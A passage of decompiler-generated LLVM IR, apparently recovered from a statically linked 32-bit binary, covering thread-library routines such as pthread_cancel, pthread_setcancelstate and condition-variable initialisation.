  %v1_8058c4b = icmp eq i1 %v9_8058c45, false
  br i1 %v1_8058c4b, label %dec_label_pc_8058c5b, label %dec_label_pc_8058c4d

dec_label_pc_8058c4d:                             ; preds = %dec_label_pc_8058c45
  store i32 %v15_8058c13, i32* %eax.global-to-local, align 4
  %v2_8058c56 = call i32 @__pthread_do_exit(i32 -1, i32 %v15_8058c13)
  store i32 %v2_8058c56, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058c5b

dec_label_pc_8058c5b:                             ; preds = %dec_label_pc_8058c45, %dec_label_pc_8058c33, %dec_label_pc_8058c4d
  %v2_8058c5b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8058c5b, i32* @ecx, align 4
  %v2_8058c5c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058c5c, i32* @ebx, align 4
  %v2_8058c5d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8058c5d, i32* @esi, align 4
  %v0_8058c5e = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8058c5e

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8058c5b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058c33, { 1, 0 }
}

define i32 @pthread_testcancel() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_8058c62 = call i32 @thread_self.12(i32 ptrtoint (i32* @0 to i32))
  %v1_8058c67 = add i32 %v1_8058c62, 66
  %v2_8058c67 = inttoptr i32 %v1_8058c67 to i8*
  %v3_8058c67 = load i8, i8* %v2_8058c67, align 1
  %v4_8058c67 = icmp eq i8 %v3_8058c67, 0
  br i1 %v4_8058c67, label %dec_label_pc_8058c81, label %dec_label_pc_8058c6d

dec_label_pc_8058c6d:                             ; preds = %entry
  %v1_8058c6d = add i32 %v1_8058c62, 64
  %v2_8058c6d = inttoptr i32 %v1_8058c6d to i8*
  %v3_8058c6d = load i8, i8* %v2_8058c6d, align 1
  %v4_8058c6d = icmp eq i8 %v3_8058c6d, 0
  %v1_8058c71 = icmp eq i1 %v4_8058c6d, false
  br i1 %v1_8058c71, label %dec_label_pc_8058c81, label %dec_label_pc_8058c73

dec_label_pc_8058c73:                             ; preds = %dec_label_pc_8058c6d
  %v2_8058c75 = ptrtoint i32* %stack_var_0 to i32
  %v2_8058c7c = call i32 @__pthread_do_exit(i32 -1, i32 %v2_8058c75)
  br label %dec_label_pc_8058c81

dec_label_pc_8058c81:                             ; preds = %dec_label_pc_8058c6d, %entry, %dec_label_pc_8058c73
  %v0_8058c84 = phi i32 [ %v1_8058c62, %dec_label_pc_8058c6d ], [ %v1_8058c62, %entry ], [ %v2_8058c7c, %dec_label_pc_8058c73 ]
  ret i32 %v0_8058c84

; uselistorder directives
  uselistorder label %dec_label_pc_8058c81, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8058c85 = load i32, i32* @ebx, align 4
  store i32 %v0_8058c85, i32* %stack_var_-4, align 4
  %v4_8058c85 = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8058c92 = sext i8 %arg1 to i32
  %tmp14 = or i8 %arg1, 1
  %tmp15 = icmp eq i8 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_8058c99, label %dec_label_pc_8058ccf

dec_label_pc_8058c99:                             ; preds = %entry
  %v1_8058c99 = call i32 @thread_self.12(i32 %v0_8058c85)
  store i32 %v1_8058c99, i32* %eax.global-to-local, align 4
  %v1_8058c9e = icmp eq i32 %arg2, 0
  store i32 %v1_8058c99, i32* %edx.global-to-local, align 4
  br i1 %v1_8058c9e, label %dec_label_pc_8058caa, label %dec_label_pc_8058ca4

dec_label_pc_8058ca4:                             ; preds = %dec_label_pc_8058c99
  %v1_8058ca4 = add i32 %v1_8058c99, 65
  %v2_8058ca4 = inttoptr i32 %v1_8058ca4 to i8*
  %v3_8058ca4 = load i8, i8* %v2_8058ca4, align 1
  %v4_8058ca4 = sext i8 %v3_8058ca4 to i32
  store i32 %v4_8058ca4, i32* %eax.global-to-local, align 4
  %v2_8058ca8 = inttoptr i32 %arg2 to i32*
  store i32 %v4_8058ca4, i32* %v2_8058ca8, align 4
  %v6_8058caa.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8058cae.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8058caa

dec_label_pc_8058caa:                             ; preds = %dec_label_pc_8058c99, %dec_label_pc_8058ca4
  %v2_8058cae = phi i32 [ %v1_8058c99, %dec_label_pc_8058c99 ], [ %v2_8058cae.pre, %dec_label_pc_8058ca4 ]
  %v6_8058caa = phi i32 [ %v1_8058c99, %dec_label_pc_8058c99 ], [ %v6_8058caa.pre, %dec_label_pc_8058ca4 ]
  %v7_8058caa = and i32 %v6_8058caa, -256
  %v8_8058caa = or i32 %v7_8058caa, %v4_8058c92
  store i32 %v8_8058caa, i32* %eax.global-to-local, align 4
  %v3_8058cae = add i32 %v2_8058cae, 65
  %v4_8058cae = inttoptr i32 %v3_8058cae to i8*
  store i8 %arg1, i8* %v4_8058cae, align 1
  %v0_8058cb1 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058cb1 = add i32 %v0_8058cb1, 66
  %v2_8058cb1 = inttoptr i32 %v1_8058cb1 to i8*
  %v3_8058cb1 = load i8, i8* %v2_8058cb1, align 1
  %v4_8058cb1 = icmp eq i8 %v3_8058cb1, 0
  br i1 %v4_8058cb1, label %dec_label_pc_8058ccd, label %dec_label_pc_8058cb7

dec_label_pc_8058cb7:                             ; preds = %dec_label_pc_8058caa
  %v1_8058cb7 = add i32 %v0_8058cb1, 64
  %v2_8058cb7 = inttoptr i32 %v1_8058cb7 to i16*
  %v3_8058cb7 = load i16, i16* %v2_8058cb7, align 2
  %v9_8058cb7 = icmp eq i16 %v3_8058cb7, 256
  %v1_8058cbd = icmp eq i1 %v9_8058cb7, false
  br i1 %v1_8058cbd, label %dec_label_pc_8058ccd, label %dec_label_pc_8058cbf

dec_label_pc_8058cbf:                             ; preds = %dec_label_pc_8058cb7
  store i32 %v4_8058c85, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-28, align 4
  %v2_8058cc8 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8058c85)
  store i32 %v2_8058cc8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058ccd

dec_label_pc_8058ccd:                             ; preds = %dec_label_pc_8058cb7, %dec_label_pc_8058caa, %dec_label_pc_8058cbf
  %stack_var_-20.0 = phi i32 [ %tmp10, %dec_label_pc_8058caa ], [ %tmp10, %dec_label_pc_8058cb7 ], [ %arg2, %dec_label_pc_8058cbf ]
  %stack_var_-24.0 = phi i32 [ %tmp9, %dec_label_pc_8058caa ], [ %tmp9, %dec_label_pc_8058cb7 ], [ %v4_8058c85, %dec_label_pc_8058cbf ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8058ccf.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_8058ccf

dec_label_pc_8058ccf:                             ; preds = %entry, %dec_label_pc_8058ccd
  %v2_8058cd1 = phi i32 [ %tmp10, %entry ], [ %stack_var_-20.0, %dec_label_pc_8058ccd ]
  %v2_8058cd0 = phi i32 [ %tmp9, %entry ], [ %stack_var_-24.0, %dec_label_pc_8058ccd ]
  %v2_8058ccf = phi i32 [ %tmp8, %entry ], [ %v2_8058ccf.pre, %dec_label_pc_8058ccd ]
  %v0_8058cd2 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8058ccd ]
  store i32 %v2_8058ccf, i32* @edx, align 4
  store i32 %v2_8058cd0, i32* @ecx, align 4
  store i32 %v2_8058cd1, i32* @ebx, align 4
  ret i32 %v0_8058cd2

; uselistorder directives
  uselistorder i32 %v1_8058c99, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp10, { 2, 0, 1 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 3, 1 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058ccf, { 1, 0 }
  uselistorder label %dec_label_pc_8058ccd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058caa, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-28, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058cd3 = load i32, i32* @ebx, align 4
  store i32 %v0_8058cd3, i32* %stack_var_-4, align 4
  %v4_8058cd3 = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_8058ce0 = sext i8 %arg1 to i32
  %tmp15 = or i8 %arg1, 1
  %tmp16 = icmp eq i8 %tmp15, 1
  br i1 %tmp16, label %dec_label_pc_8058ce7, label %dec_label_pc_8058d1d

dec_label_pc_8058ce7:                             ; preds = %entry
  %v1_8058ce7 = call i32 @thread_self.12(i32 %v0_8058cd3)
  store i32 %v1_8058ce7, i32* %eax.global-to-local, align 4
  %v1_8058cec = icmp eq i32 %arg2, 0
  store i32 %v1_8058ce7, i32* %edx.global-to-local, align 4
  br i1 %v1_8058cec, label %dec_label_pc_8058cf8, label %dec_label_pc_8058cf2

dec_label_pc_8058cf2:                             ; preds = %dec_label_pc_8058ce7
  %v1_8058cf2 = add i32 %v1_8058ce7, 64
  %v2_8058cf2 = inttoptr i32 %v1_8058cf2 to i8*
  %v3_8058cf2 = load i8, i8* %v2_8058cf2, align 1
  %v4_8058cf2 = sext i8 %v3_8058cf2 to i32
  store i32 %v4_8058cf2, i32* %eax.global-to-local, align 4
  %v2_8058cf6 = inttoptr i32 %arg2 to i32*
  store i32 %v4_8058cf2, i32* %v2_8058cf6, align 4
  %v6_8058cf8.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8058cfc.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8058cf8

dec_label_pc_8058cf8:                             ; preds = %dec_label_pc_8058ce7, %dec_label_pc_8058cf2
  %v2_8058cfc = phi i32 [ %v1_8058ce7, %dec_label_pc_8058ce7 ], [ %v2_8058cfc.pre, %dec_label_pc_8058cf2 ]
  %v6_8058cf8 = phi i32 [ %v1_8058ce7, %dec_label_pc_8058ce7 ], [ %v6_8058cf8.pre, %dec_label_pc_8058cf2 ]
  %v7_8058cf8 = and i32 %v6_8058cf8, -256
  %v8_8058cf8 = or i32 %v7_8058cf8, %v4_8058ce0
  store i32 %v8_8058cf8, i32* %eax.global-to-local, align 4
  %v3_8058cfc = add i32 %v2_8058cfc, 64
  %v4_8058cfc = inttoptr i32 %v3_8058cfc to i8*
  store i8 %arg1, i8* %v4_8058cfc, align 1
  %v0_8058cff = load i32, i32* %edx.global-to-local, align 4
  %v1_8058cff = add i32 %v0_8058cff, 66
  %v2_8058cff = inttoptr i32 %v1_8058cff to i8*
  %v3_8058cff = load i8, i8* %v2_8058cff, align 1
  %v4_8058cff = icmp eq i8 %v3_8058cff, 0
  br i1 %v4_8058cff, label %dec_label_pc_8058d1b, label %dec_label_pc_8058d05

dec_label_pc_8058d05:                             ; preds = %dec_label_pc_8058cf8
  %v1_8058d05 = add i32 %v0_8058cff, 64
  %v2_8058d05 = inttoptr i32 %v1_8058d05 to i16*
  %v3_8058d05 = load i16, i16* %v2_8058d05, align 2
  %v9_8058d05 = icmp eq i16 %v3_8058d05, 256
  %v1_8058d0b = icmp eq i1 %v9_8058d05, false
  br i1 %v1_8058d0b, label %dec_label_pc_8058d1b, label %dec_label_pc_8058d0d

dec_label_pc_8058d0d:                             ; preds = %dec_label_pc_8058d05
  store i32 %v4_8058cd3, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-28, align 4
  %v2_8058d16 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8058cd3)
  store i32 %v2_8058d16, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058d1b

dec_label_pc_8058d1b:                             ; preds = %dec_label_pc_8058d05, %dec_label_pc_8058cf8, %dec_label_pc_8058d0d
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8058d1d.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_8058d1d

dec_label_pc_8058d1d:                             ; preds = %entry, %dec_label_pc_8058d1b
  %v2_8058d1d = phi i32 [ %tmp9, %entry ], [ %v2_8058d1d.pre, %dec_label_pc_8058d1b ]
  %v0_8058d20 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8058d1b ]
  store i32 %v2_8058d1d, i32* %edx.global-to-local, align 4
  ret i32 %v0_8058d20

; uselistorder directives
  uselistorder i32 %v1_8058ce7, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @thread_self.12, { 7, 0, 6, 3, 4, 5, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8058d1d, { 1, 0 }
  uselistorder label %dec_label_pc_8058d1b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058cf8, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %zf.global-to-local = alloca i1, align 1
  %v0_8058d24 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8058d30 = urem i32 %arg1, 1024
  %v2_8058d30 = icmp eq i32 %v1_8058d30, 0
  %v2_8058d35 = mul nuw nsw i32 %v1_8058d30, 16
  store i1 %v2_8058d30, i1* %zf.global-to-local, align 1
  %v1_8058d38 = add i32 %v2_8058d35, ptrtoint (i32* @global_var_806f8a0.659 to i32)
  store i32 %v1_8058d38, i32* @edi, align 4
  store i32 %v1_8058d38, i32* @eax, align 4
  %v1_8058d40 = call i32 @__pthread_lock(i32 %v0_8058d24)
  %v0_8058d45 = load i32, i32* @edi, align 4
  %v1_8058d45 = add i32 %v0_8058d45, 8
  %v2_8058d45 = inttoptr i32 %v1_8058d45 to i32*
  %v3_8058d45 = load i32, i32* %v2_8058d45, align 4
  store i32 %v3_8058d45, i32* @ebx, align 4
  %v1_8058d48 = icmp eq i32 %v3_8058d45, 0
  store i1 %v1_8058d48, i1* %zf.global-to-local, align 1
  br i1 %v1_8058d48, label %dec_label_pc_8058d51, label %dec_label_pc_8058d4c

dec_label_pc_8058d4c:                             ; preds = %entry
  %v1_8058d4c = add i32 %v3_8058d45, 16
  %v2_8058d4c = inttoptr i32 %v1_8058d4c to i32*
  %v3_8058d4c = load i32, i32* %v2_8058d4c, align 4
  %v4_8058d4c = load i32, i32* @esi, align 4
  %v15_8058d4c = icmp eq i32 %v3_8058d4c, %v4_8058d4c
  store i1 %v15_8058d4c, i1* %zf.global-to-local, align 1
  br i1 %v15_8058d4c, label %dec_label_pc_8058d61, label %dec_label_pc_8058d51

dec_label_pc_8058d51:                             ; preds = %dec_label_pc_8058d4c, %entry
  %v0_8058d51 = load i32, i32* @esp, align 4
  %v9_8058d51 = icmp eq i32 %v0_8058d51, 12
  store i1 %v9_8058d51, i1* %zf.global-to-local, align 1
  %v1_8058d55 = inttoptr i32 %v0_8058d45 to i32*
  %v2_8058d55 = call i32 @__pthread_unlock(i32* %v1_8058d55)
  br label %dec_label_pc_8058dcb

dec_label_pc_8058d61:                             ; preds = %dec_label_pc_8058d4c
  %v1_8058d61 = add i32 %v3_8058d45, 66
  %v2_8058d61 = inttoptr i32 %v1_8058d61 to i8*
  %v3_8058d61 = load i8, i8* %v2_8058d61, align 1
  %v1_8058d65 = add i32 %v3_8058d45, 64
  %v2_8058d65 = inttoptr i32 %v1_8058d65 to i8*
  %v3_8058d65 = load i8, i8* %v2_8058d65, align 1
  %v12_8058d65 = icmp eq i8 %v3_8058d65, 1
  store i1 %v12_8058d65, i1* %zf.global-to-local, align 1
  store i8 1, i8* %v2_8058d61, align 1
  %v0_8058d6d = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8058d6d, label %dec_label_pc_8058d73, label %dec_label_pc_8058d6f

dec_label_pc_8058d6f:                             ; preds = %dec_label_pc_8058d61
  %v1_8058d6f = icmp eq i8 %v3_8058d61, 0
  store i1 %v1_8058d6f, i1* %zf.global-to-local, align 1
  br i1 %v1_8058d6f, label %dec_label_pc_8058d7e, label %dec_label_pc_8058d73

dec_label_pc_8058d73:                             ; preds = %dec_label_pc_8058d6f, %dec_label_pc_8058d61
  %v0_8058d73 = load i32, i32* @esp, align 4
  %v9_8058d73 = icmp eq i32 %v0_8058d73, 12
  store i1 %v9_8058d73, i1* %zf.global-to-local, align 1
  %v0_8058d76 = load i32, i32* @edi, align 4
  %v1_8058d77 = inttoptr i32 %v0_8058d76 to i32*
  %v2_8058d77 = call i32 @__pthread_unlock(i32* %v1_8058d77)
  br label %dec_label_pc_8058dc9

dec_label_pc_8058d7e:                             ; preds = %dec_label_pc_8058d6f
  %v1_8058d7e = add i32 %v3_8058d45, 444
  %v2_8058d7e = inttoptr i32 %v1_8058d7e to i32*
  %v3_8058d7e = load i32, i32* %v2_8058d7e, align 4
  store i32 0, i32* @esi, align 4
  %v1_8058d89 = icmp eq i32 %v3_8058d7e, 0
  store i1 %v1_8058d89, i1* %zf.global-to-local, align 1
  br i1 %v1_8058d89, label %dec_label_pc_8058da0, label %dec_label_pc_8058d8d

dec_label_pc_8058d8d:                             ; preds = %dec_label_pc_8058d7e
  %v3_8058d89 = trunc i32 %v3_8058d7e to i8
  %v5_8058d92 = add i32 %v3_8058d7e, 4
  %v6_8058d92 = inttoptr i32 %v5_8058d92 to i32*
  %v7_8058d92 = load i32, i32* %v6_8058d92, align 4
  call void @__pseudo_call(i32 %v7_8058d92)
  %v0_8058d95 = load i32, i32* @esp, align 4
  %v6_8058d95 = icmp eq i32 %v0_8058d95, -16
  store i1 %v6_8058d95, i1* %zf.global-to-local, align 1
  store i32 %v3_8058d7e, i32* @esi, align 4
  %v3_8058d9a = add i32 %v3_8058d45, 440
  %v4_8058d9a = inttoptr i32 %v3_8058d9a to i8*
  store i8 %v3_8058d89, i8* %v4_8058d9a, align 1
  br label %dec_label_pc_8058da0

dec_label_pc_8058da0:                             ; preds = %dec_label_pc_8058d7e, %dec_label_pc_8058d8d
  %v0_8058da0 = load i32, i32* @esp, align 4
  %v9_8058da0 = icmp eq i32 %v0_8058da0, 12
  store i1 %v9_8058da0, i1* %zf.global-to-local, align 1
  %v0_8058da3 = load i32, i32* @edi, align 4
  %v1_8058da4 = inttoptr i32 %v0_8058da3 to i32*
  %v2_8058da4 = call i32 @__pthread_unlock(i32* %v1_8058da4)
  %v0_8058dac = load i32, i32* @esi, align 4
  %v1_8058dac = icmp eq i32 %v0_8058dac, 0
  store i1 %v1_8058dac, i1* %zf.global-to-local, align 1
  br i1 %v1_8058dac, label %dec_label_pc_8058dbb, label %dec_label_pc_8058db0

dec_label_pc_8058db0:                             ; preds = %dec_label_pc_8058da0
  store i1 false, i1* %zf.global-to-local, align 1
  %v1_8058db4 = call i32 @__pthread_restart_new(i32 %v3_8058d45)
  br label %dec_label_pc_8058dc9

dec_label_pc_8058dbb:                             ; preds = %dec_label_pc_8058da0
  %v0_8058dbd = load i32, i32* @global_var_8073c8c.671, align 4
  %v2_8058dc4 = call i32 @kill(i32 %v0_8058dbd, i32 0)
  br label %dec_label_pc_8058dc9

dec_label_pc_8058dc9:                             ; preds = %dec_label_pc_8058db0, %dec_label_pc_8058d73, %dec_label_pc_8058dbb
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8058dcb

dec_label_pc_8058dcb:                             ; preds = %dec_label_pc_8058d51, %dec_label_pc_8058dc9
  %storemerge = phi i32 [ 3, %dec_label_pc_8058d51 ], [ 0, %dec_label_pc_8058dc9 ]
  %v0_8058dcb = load i32, i32* @esp, align 4
  %v9_8058dcb = icmp eq i32 %v0_8058dcb, -28
  store i1 %v9_8058dcb, i1* %zf.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8058d7e, { 1, 0, 2, 3 }
  uselistorder i1 %v15_8058d4c, { 1, 0 }
  uselistorder i32 %v3_8058d45, { 5, 3, 1, 2, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_8058dcb, { 1, 0 }
  uselistorder label %dec_label_pc_8058dc9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058da0, { 1, 0 }
}

define i32 @enqueue.13() local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue.14() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8058df1 = load i32, i32* @ebx, align 4
  store i32 %v0_8058df1, i32* %stack_var_-4, align 4
  %v0_8058df2 = load i32, i32* @eax, align 4
  br label %dec_label_pc_8058e10

dec_label_pc_8058df6:                             ; preds = %dec_label_pc_8058e10
  %v1_8058df6 = load i32, i32* @edx, align 4
  %v12_8058df6 = icmp eq i32 %v2_8058e10, %v1_8058df6
  %v1_8058df8 = icmp eq i1 %v12_8058df6, false
  %v1_8058e0d = add i32 %v2_8058e10, 8
  br i1 %v1_8058df8, label %dec_label_pc_8058e10, label %dec_label_pc_8058dfa

dec_label_pc_8058dfa:                             ; preds = %dec_label_pc_8058df6
  %v2_8058dfa = inttoptr i32 %v1_8058e0d to i32*
  %v3_8058dfa = load i32, i32* %v2_8058dfa, align 4
  store i32 %v3_8058dfa, i32* %v1_8058e10, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v2_8058dfa, align 4
  %v2_8058e18.pre = load i32, i32* %stack_var_-4, align 4
  %v0_8058e19.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058e18

dec_label_pc_8058e10:                             ; preds = %dec_label_pc_8058df6, %entry
  %v1_8058dfd = phi i32 [ %v0_8058df2, %entry ], [ %v1_8058e0d, %dec_label_pc_8058df6 ]
  %v1_8058e10 = inttoptr i32 %v1_8058dfd to i32*
  %v2_8058e10 = load i32, i32* %v1_8058e10, align 4
  %v1_8058e12 = icmp eq i32 %v2_8058e10, 0
  %v1_8058e14 = icmp eq i1 %v1_8058e12, false
  br i1 %v1_8058e14, label %dec_label_pc_8058df6, label %dec_label_pc_8058e16

dec_label_pc_8058e16:                             ; preds = %dec_label_pc_8058e10
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058e18

dec_label_pc_8058e18:                             ; preds = %dec_label_pc_8058dfa, %dec_label_pc_8058e16
  %v0_8058e19 = phi i32 [ %v0_8058e19.pre, %dec_label_pc_8058dfa ], [ 0, %dec_label_pc_8058e16 ]
  %v2_8058e18 = phi i32 [ %v2_8058e18.pre, %dec_label_pc_8058dfa ], [ %v0_8058df1, %dec_label_pc_8058e16 ]
  store i32 %v2_8058e18, i32* @ebx, align 4
  ret i32 %v0_8058e19

; uselistorder directives
  uselistorder i32 %v2_8058e10, { 2, 0, 1 }
  uselistorder i32* %v1_8058e10, { 1, 0 }
  uselistorder i32 %v1_8058e0d, { 1, 0 }
  uselistorder label %dec_label_pc_8058e18, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp1 = ptrtoint i32* %arg1 to i32
  store i32 %tmp1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %arg1, align 4
  %v1_8058e24 = add i32 %tmp1, 4
  %v2_8058e24 = inttoptr i32 %v1_8058e24 to i32*
  store i32 0, i32* %v2_8058e24, align 4
  %v0_8058e2b = load i32, i32* %eax.global-to-local, align 4
  %v1_8058e2b = add i32 %v0_8058e2b, 8
  %v2_8058e2b = inttoptr i32 %v1_8058e2b to i32*
  store i32 0, i32* %v2_8058e2b, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 16
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp2 = or i32 %arg1, 1
  %tmp3 = icmp eq i32 %tmp2, 1
  br i1 %tmp3, label %dec_label_pc_8058e66, label %dec_label_pc_8058e6d

dec_label_pc_8058e66:                             ; preds = %entry
  br label %dec_label_pc_8058e6d

dec_label_pc_8058e6d:                             ; preds = %entry, %dec_label_pc_8058e66
  %v0_8058e6d = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_8058e66 ]
  ret i32 %v0_8058e6d

; uselistorder directives
  uselistorder label %dec_label_pc_8058e6d, { 1, 0 }
}

define i32 @__pthread_set_own_extricate_if.15(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8058e6e = load i32, i32* @esi, align 4
  %v0_8058e6f = load i32, i32* @ebx, align 4
  %v0_8058e73 = load i32, i32* @eax, align 4
  store i32 %v0_8058e73, i32* @ebx, align 4
  %v0_8058e75 = load i32, i32* @edx, align 4
  store i32 %v0_8058e75, i32* @esi, align 4
  %v1_8058e77 = icmp eq i32 %v0_8058e75, 0
  br i1 %v1_8058e77, label %dec_label_pc_8058e83, label %dec_label_pc_8058e7b

dec_label_pc_8058e7b:                             ; preds = %entry
  %v1_8058e7b = add i32 %v0_8058e73, 64
  %v2_8058e7b = inttoptr i32 %v1_8058e7b to i8*
  %v3_8058e7b = load i8, i8* %v2_8058e7b, align 1
  %v4_8058e7b = icmp eq i8 %v3_8058e7b, 0
  %v1_8058e7f = icmp eq i1 %v4_8058e7b, false
  br i1 %v1_8058e7f, label %dec_label_pc_8058ea5, label %dec_label_pc_8058e8d

dec_label_pc_8058e83:                             ; preds = %entry
  %v1_8058e83 = add i32 %v0_8058e73, 28
  %v2_8058e83 = inttoptr i32 %v1_8058e83 to i32*
  %v3_8058e83 = load i32, i32* %v2_8058e83, align 4
  store i32 %v3_8058e83, i32* @eax, align 4
  store i32 %v0_8058e73, i32* @edx, align 4
  %v1_8058e88 = call i32 @__pthread_lock(i32 %v0_8058e6f)
  %v1_8058e8d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8058e8d

dec_label_pc_8058e8d:                             ; preds = %dec_label_pc_8058e7b, %dec_label_pc_8058e83
  %v1_8058e8d = phi i32 [ %v0_8058e73, %dec_label_pc_8058e7b ], [ %v1_8058e8d.pre, %dec_label_pc_8058e83 ]
  %v2_8058e8d = add i32 %v1_8058e8d, 444
  %v3_8058e8d = inttoptr i32 %v2_8058e8d to i32*
  store i32 %v0_8058e75, i32* %v3_8058e8d, align 4
  %v1_8058e95 = icmp eq i1 %v1_8058e77, false
  br i1 %v1_8058e95, label %dec_label_pc_8058ea5, label %dec_label_pc_8058e97

dec_label_pc_8058e97:                             ; preds = %dec_label_pc_8058e8d
  %v0_8058e9a = load i32, i32* @ebx, align 4
  %v1_8058e9a = add i32 %v0_8058e9a, 28
  %v2_8058e9a = inttoptr i32 %v1_8058e9a to i32*
  %v3_8058e9a = load i32, i32* %v2_8058e9a, align 4
  %v1_8058e9d = inttoptr i32 %v3_8058e9a to i32*
  %v2_8058e9d = call i32 @__pthread_unlock(i32* %v1_8058e9d)
  br label %dec_label_pc_8058ea5

dec_label_pc_8058ea5:                             ; preds = %dec_label_pc_8058e8d, %dec_label_pc_8058e7b, %dec_label_pc_8058e97
  %v2_8058ea5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8058e6f, i32* @ebx, align 4
  store i32 %v0_8058e6e, i32* @esi, align 4
  ret i32 %v2_8058ea5

; uselistorder directives
  uselistorder i1 %v1_8058e77, { 1, 0 }
  uselistorder i32 444, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8058ea5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058e8d, { 1, 0 }
}

define i32 @restart.16() local_unnamed_addr {
entry:
  %v0_8058eac = load i32, i32* @eax, align 4
  %v1_8058ead = call i32 @__pthread_restart_new(i32 %v0_8058eac)
  ret i32 %v1_8058ead

; uselistorder directives
  uselistorder i32 (i32)* @__pthread_restart_new, { 2, 5, 0, 4, 3, 1 }
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8058eb7 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @ebx, align 4
